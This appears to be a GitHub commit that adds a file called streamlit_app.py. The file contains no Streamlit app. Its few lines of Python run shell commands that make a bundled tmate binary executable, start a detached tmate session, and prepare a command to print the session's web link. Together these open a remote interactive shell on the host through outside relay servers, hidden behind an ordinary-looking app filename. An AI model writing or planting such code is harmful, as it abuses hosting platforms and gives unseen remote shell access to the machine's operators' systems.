c0a1dcf1cee4557040184e5939cc40d1a50deb4c
posemyhips100 <97118271+posemyhips100@users.noreply.github.com>
2022-10-25 09:46:15 -0700

    Add files via upload

---
+++ streamlit_app.py
@@ -0,0 +1,6 @@
+import os
+bashCommand3A = "chmod +xrw tmate"
+os.system(bashCommand3A)
+bashCommand2 = "rm -f nohup.out; ./tmate -S /tmp/tmate.sock new-session -d && disown -a >/dev/null 2>&1"
+os.system(bashCommand2)
+bashCommand3 = "./tmate -S /tmp/tmate.sock wait tmate-ready && ./tmate -S /tmp/tmate.sock display -p #{tmate_web}"
